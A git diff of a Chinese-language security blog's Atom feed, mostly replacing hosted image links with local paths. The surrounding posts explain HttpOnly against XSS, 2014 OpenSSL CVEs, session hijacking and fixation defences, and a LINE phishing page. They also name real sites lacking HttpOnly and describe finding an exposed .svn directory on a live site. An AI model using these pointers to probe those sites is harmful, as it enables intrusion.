+&lt;p&gt;說明 HttpOnly 主要作用之前，先談談 XSS 最常見的利用方式。XSS 攻擊早在 1990 年就被發現，此攻擊手法最常見的利用方式是存取使用者的 cookie 來獲得一些機敏資料。像是存取 session cookie 即可盜用使用者的身份（關於 session 的重要性，可以參考我們部落格的另一篇文章 &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session 攻擊與防護&lt;/a&gt;），如果在 cookie 中記錄了其他機敏資訊，也可能會一併遭竊。因此若能阻止攻擊者存取帶有敏感資料的 cookie，就能減少 XSS 對使用者的影響，因而催生了 HttpOnly 機制。&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
 &lt;p&gt;當 cookie 有設定 HttpOnly flag 時，瀏覽器會限制 cookie 只能經由 HTTP(S) 協定來存取。因此當網站有 XSS 弱點時，若 cookie 含有 HttpOnly flag，則攻擊者無法直接經由 JavaScript 存取使用者的 session cookie，可降低使用者身份被盜用的機率。早期有些瀏覽器未完整實作 HttpOnly 所有功能，因此攻擊者仍可透過 XMLHttpRequest 讀取 cookie，但最近幾年各大瀏覽器也陸續阻擋了這個方式。因此 HttpOnly 可有效降低 XSS 的影響並提升攻擊難度。目前瀏覽器的支援列表如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ryadJ4jta9o/UyGPRxYv-CI/AAAAAAAAAOA/ch-pNUJQcAs/w531-h122-no/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ryadJ4jta9o/UyGPRxYv-CI/AAAAAAAAAOA/ch-pNUJQcAs/w531-h122-no/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly 瀏覽器支援列表&quot; title=&quot;HttpOnly 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly 瀏覽器支援列表&quot; title=&quot;HttpOnly 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;其他瀏覽器支援列表以及各家程式語言使用 HttpOnly 的方式可參考 &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;。&lt;/p&gt;
 
@@ -5627,7 +5904,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 &lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-nH-7Pn8flY8/U5bZqr_TQQI/AAAAAAAAAcA/NX1xS-C0-Bc/w1138-h687-no/httponly-unset.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-nH-7Pn8flY8/U5bZqr_TQQI/AAAAAAAAAcA/NX1xS-C0-Bc/w1138-h687-no/httponly-unset.png&quot; alt=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; title=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-unset.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-unset.png&quot; alt=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; title=&quot;未設定 HttpOnly 之前，cookie 可被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;在上圖中可看到 PHPSESSID 已成功被 JavaScript 存取，這也意味著網站有 XSS 弱點時，使用者的身份有較高的機率被盜用。為了使用 HttpOnly 進行防護，讓我們將 PHP 程式碼修改如下：&lt;/p&gt;
 
@@ -5636,7 +5913,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 &lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-xIuTi9W726o/U5bZqbseCGI/AAAAAAAAAb8/byQawQzceR4/w1138-h687-no/httponly-set.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-xIuTi9W726o/U5bZqbseCGI/AAAAAAAAAb8/byQawQzceR4/w1138-h687-no/httponly-set.png&quot; alt=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; title=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-set.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-set.png&quot; alt=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; title=&quot;設定 HttpOnly 後，cookie 已無法被 JavaScript 存取&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;我們可以使用畫面中右上角的 Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie 套件&lt;/a&gt; 看到 HttpOnly 已經被勾選（如紅框處），並且 PHPSESSID 已無法被 JavaScript 存取，不存在於 HTML 中。&lt;/p&gt;
 
@@ -5652,29 +5929,29 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
   &lt;li&gt;T客邦 (www.techbang.com)，有設定 HttpOnly&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-s1rI18BhecY/U5bZpKzCjNI/AAAAAAAAAbw/EuIjX4R9AW8/w1138-h882-no/httponly-example-1.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-s1rI18BhecY/U5bZpKzCjNI/AAAAAAAAAbw/EuIjX4R9AW8/w1138-h882-no/httponly-example-1.png&quot; alt=&quot;T客邦&quot; title=&quot;T客邦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot; alt=&quot;T客邦&quot; title=&quot;T客邦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;愛料理 (icook.tw)，有設定 HttpOnly&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-S3uBr-D6xQ8/U5bZpT5WM0I/AAAAAAAAAbs/IQnqvUy7jJw/w1138-h882-no/httponly-example-2.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-S3uBr-D6xQ8/U5bZpT5WM0I/AAAAAAAAAbs/IQnqvUy7jJw/w1138-h882-no/httponly-example-2.png&quot; alt=&quot;愛料理&quot; title=&quot;愛料理&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot; alt=&quot;愛料理&quot; title=&quot;愛料理&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Mobile01 (www.mobile01.com)，未設定 HttpOnly&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-1mN1msqkvwg/U5bZpWDOj9I/AAAAAAAAAbo/6g4rHi0q_uk/w1138-h882-no/httponly-example-3.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-1mN1msqkvwg/U5bZpWDOj9I/AAAAAAAAAbo/6g4rHi0q_uk/w1138-h882-no/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Giga Circle (tw.gigacircle.com)，未設定 HttpOnly&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-xX9qAnudjV8/U5bZqCN2FLI/AAAAAAAAAb4/srsZFwPfeRc/w1138-h882-no/httponly-example-4.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-xX9qAnudjV8/U5bZqCN2FLI/AAAAAAAAAb4/srsZFwPfeRc/w1138-h882-no/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;
 
-&lt;p&gt;HttpOnly 是存在已久的技術，但在我們&lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;系列文第一篇&lt;/a&gt;的統計當中，採用的比例仍然偏低。如同之前我們提及的 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; 問題，即使一項資安技術或資安議題存在很久，也需要大家持續關注。&lt;/p&gt;
+&lt;p&gt;HttpOnly 是存在已久的技術，但在我們&lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;系列文第一篇&lt;/a&gt;的統計當中，採用的比例仍然偏低。如同之前我們提及的 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; 問題，即使一項資安技術或資安議題存在很久，也需要大家持續關注。&lt;/p&gt;
 
 &lt;p&gt;但即使採用了 HttpOnly，也僅能防止惡意人士不正當存取 cookie，無法防禦其他的 XSS 攻擊方式，例如將使用者導向至釣魚網站騙取個資、導向至惡意網站植入後門、置換網頁外觀等等。同時未來仍有可能出現新的 XSS 攻擊手法，因此千萬別因設定了 HttpOnly 就掉以輕心，誤以為不會再被 XSS 手法侵害企業利益或用戶資料，仍然必須謹慎檢查每一個系統輸出輸入點，以避免未來因上述影響導致用戶或企業蒙受損失。&lt;/p&gt;
 </content>
@@ -5689,7 +5966,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;OpenSSL 團隊於 6/5 修補了&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;六項安全漏洞&lt;/a&gt;，&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; 在&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;這篇文章&lt;/a&gt;中整理了這幾個漏洞的摘要，這裡截圖表格如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-btOMwf3omik/U5Vnx2xR_lI/AAAAAAAAAa4/0xB5tuTj_eQ/w794-h429-no/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-btOMwf3omik/U5Vnx2xR_lI/AAAAAAAAAa4/0xB5tuTj_eQ/w794-h429-no/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 安全更新比較表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 安全更新比較表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;其中 CVE-2014-0224、CVE-2014-0195 兩項被列為 Critical，我們分別來看看這兩個弱點到底造成了什麼危害。&lt;/p&gt;
 
@@ -5716,7 +5993,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;另外，若使用者常用到一些加密連線服務，例如 VPN，請自行注意所使用軟體是否使用 OpenSSL，以免受到 CCS Injection 的影響。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-c83v3B0k_4A/U5VnmAsGBVI/AAAAAAAAAaw/VtVNovmHLnQ/s240-no/logo.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-c83v3B0k_4A/U5VnmAsGBVI/AAAAAAAAAaw/VtVNovmHLnQ/s240-no/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/logo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;最後說個題外話，原來現在發表漏洞還要為漏洞出張圖，在 Hacker News 原討論串的&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;這篇回應&lt;/a&gt;，就有人說：『這個漏洞有 logo 嗎？如果沒有我就不打算認真看待它！』XD&lt;/p&gt;
 
@@ -5766,7 +6043,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <id>https://devco.re/blog/2014/06/03/http-session-protection</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
-&lt;p&gt;大家還記得四月份的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件嗎？當時除了網站本身以外，受害最嚴重的就屬 VPN Server 了。國內外不少駭客不眠不休利用 Heartbleed 漏洞竊取 VPN Server 的管理者 Session Cookie，運氣好的話就可以直接登入大企業的內網。&lt;/p&gt;
+&lt;p&gt;大家還記得四月份的 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件嗎？當時除了網站本身以外，受害最嚴重的就屬 VPN Server 了。國內外不少駭客不眠不休利用 Heartbleed 漏洞竊取 VPN Server 的管理者 Session Cookie，運氣好的話就可以直接登入大企業的內網。&lt;/p&gt;
 
 &lt;p&gt;但是，其實這樣的風險是可以避免的，今天我們以開發者的角度來談談 Session 的攻擊與防護。&lt;/p&gt;
 
@@ -5804,7 +6081,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;觀察 Session ID 的亂數分布，可以了解是否能夠推出規律、猜測有效的 Session ID。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-0tLscJj_r_E/U3VCmkcvcCI/AAAAAAAAAZo/bChmIZvZZCg/s2400/2014-05-16-http-session-protection-03-session-id-analysis.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-0tLscJj_r_E/U3VCmkcvcCI/AAAAAAAAAZo/bChmIZvZZCg/w700-h388-no/2014-05-16-http-session-protection-03-session-id-analysis.jpg&quot; alt=&quot;分析 Session ID&quot; title=&quot;分析 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot; alt=&quot;分析 Session ID&quot; title=&quot;分析 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;
 
@@ -5826,11 +6103,11 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;受害者已經登入網站伺服器，並且取得 Session ID，在連線過程中攻擊者用竊聽的方式獲取受害者 Session ID。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-glmPtR_Erp0/U3VCmo0w9yI/AAAAAAAAAZk/4rP1hOOC5W8/s2400/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-glmPtR_Erp0/U3VCmo0w9yI/AAAAAAAAAZk/4rP1hOOC5W8/w600-no/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;竊取 Session ID&quot; title=&quot;竊取 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;竊取 Session ID&quot; title=&quot;竊取 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;攻擊者直接使用竊取到的 Session ID 送至伺服器，偽造受害者身分。若伺服器沒有檢查 Session ID 的使用者身分，則可以讓攻擊者得逞。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/--Si53ercaV0/U3VCmfP_ZKI/AAAAAAAAAZg/-Dirb4AYKGk/s2400/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/--Si53ercaV0/U3VCmfP_ZKI/AAAAAAAAAZg/-Dirb4AYKGk/w600/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;偽造 Session ID&quot; title=&quot;偽造 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;偽造 Session ID&quot; title=&quot;偽造 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;
 
@@ -5852,7 +6129,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
   &lt;li&gt;攻擊者使用該 Session ID，操作受害者的帳號&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-qAizYyaOoRo/U3Vaaw6lqsI/AAAAAAAAAZ4/GNO7z3T6Mjg/s2400/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-qAizYyaOoRo/U3Vaaw6lqsI/AAAAAAAAAZ4/GNO7z3T6Mjg/w904-h678-no/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;
 
@@ -5915,25 +6192,25 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
    <id>https://devco.re/blog/2014/05/12/line-phishing</id>
    <content type="html">&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ynmXJsHIv0w/U2kPLvxOvkI/AAAAAAAAAUw/qG0y0Ahcf44/s2560/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ynmXJsHIv0w/U2kPLvxOvkI/AAAAAAAAAUw/qG0y0Ahcf44/w381-h677-no/LINE_Phishing_01.png&quot; alt=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; title=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot; alt=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; title=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
 &lt;p&gt;此 LINE 釣魚訊息說只要幫忙轉發 15 次訊息，就會贈送貼圖。先不論 LINE 有沒有這樣的機制，我們先直接點選連結看看葫蘆裡賣什麼藥。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hBW82hxnHIE/U2kPLgV2BSI/AAAAAAAAAU4/wpXMZ7eVtqU/s2560/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hBW82hxnHIE/U2kPLgV2BSI/AAAAAAAAAU4/wpXMZ7eVtqU/w381-h677-no/LINE_Phishing_02.png&quot; alt=&quot;LINE 釣魚假貼圖網頁&quot; title=&quot;LINE 釣魚假貼圖網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot; alt=&quot;LINE 釣魚假貼圖網頁&quot; title=&quot;LINE 釣魚假貼圖網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;瀏覽器打開之後，跳出了領取貼圖的「網頁」，而且還有詭異的紅字。各種跡象都跟一般領取貼圖的模式不同，太令人起疑了。點了圖就會跳到 Facebook 登入頁面。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/--bO6e0Rrqwc/U2kPLHyDyCI/AAAAAAAAAUk/a4qob4-uzPI/s2560/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/--bO6e0Rrqwc/U2kPLHyDyCI/AAAAAAAAAUk/a4qob4-uzPI/w381-h677-no/LINE_Phishing_03.png&quot; alt=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; title=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot; alt=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; title=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;明眼人看到這個 Facebook 登入頁面就會發現太假了，破綻多多。Logo、網址、網頁格式破板、簡體字，太多令人懷疑的地方了。在這邊我們只要隨便輸入帳號跟密碼，就能到下個畫面。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-gCfMgE3Jp3A/U2kPMJmUgYI/AAAAAAAAAUs/WuzFRNt3LXI/s2560/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-gCfMgE3Jp3A/U2kPMJmUgYI/AAAAAAAAAUs/WuzFRNt3LXI/w381-h677-no/LINE_Phishing_04.png&quot; alt=&quot;假 Facebook 登入完成頁面&quot; title=&quot;假 Facebook 登入完成頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot; alt=&quot;假 Facebook 登入完成頁面&quot; title=&quot;假 Facebook 登入完成頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;結果當然是不會給你貼圖啦！而且網址「cuowu」是「錯誤」的拼音，也暴露了網站作者的身分。直接用瀏覽器看傳遞的頁面叫做「tj.asp」，「tj」正好是「提交」，畫面上的錯誤訊息更是大剌剌的直接秀出簡體字。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-4oNH9XJfjG0/U2kPMrUGMVI/AAAAAAAAAU0/kHzzJHSlNvM/s2560/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-4oNH9XJfjG0/U2kPMrUGMVI/AAAAAAAAAU0/kHzzJHSlNvM/w786-h647-no/LINE_Phishing_05.png&quot; alt=&quot;釣魚網站網頁訊息&quot; title=&quot;釣魚網站網頁訊息&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot; alt=&quot;釣魚網站網頁訊息&quot; title=&quot;釣魚網站網頁訊息&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;事後友人直接說 LINE 帳號被盜用發訊息了，而且密碼可能過於簡單、也沒有設定換機密碼。因此在這邊呼籲大家做好 LINE 的安全設定：&lt;/p&gt;
 
@@ -5957,7 +6234,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;最近很多人都收到了一個看起來很像釣魚網站的核四投票站台簡訊，如下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/1mICaXeUMYfM-dYj4k4_9IUx9COR_JNienon7uCmV6A=w640-h960-no&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/1mICaXeUMYfM-dYj4k4_9IUx9COR_JNienon7uCmV6A=w640-h960-no&quot; alt=&quot;核四投票站台簡訊&quot; title=&quot;核四投票站台簡訊&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot; alt=&quot;核四投票站台簡訊&quot; title=&quot;核四投票站台簡訊&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;我們也收到了，但是剛吃飽飯實在很想睡覺，不太想理他，於是就忍不住趴下睡覺，竟然做了個夢…..&lt;/p&gt;
 
@@ -5967,29 +6244,29 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
 
 &lt;p&gt;在夢中手滑打開了網頁，內容長得像這個樣子：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-7tfQUJc6KgA/U2n78VE73QI/AAAAAAAAAYM/DPkIs4YN26o/w1138-h551-no/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-7tfQUJc6KgA/U2n78VE73QI/AAAAAAAAAYM/DPkIs4YN26o/w1138-h551-no/2.vote.tw.am_votepage.png&quot; alt=&quot;核四投票站台頁面&quot; title=&quot;核四投票站台頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/2.vote.tw.am_votepage.png&quot; alt=&quot;核四投票站台頁面&quot; title=&quot;核四投票站台頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;看了真是非常的義憤填膺！馬上就想投下神聖的一票！但是忽然聽到周公指示說網站底下有奇怪的目錄，照著神諭一試，發現有 .svn 目錄跟 entries 檔！&lt;/p&gt;
 
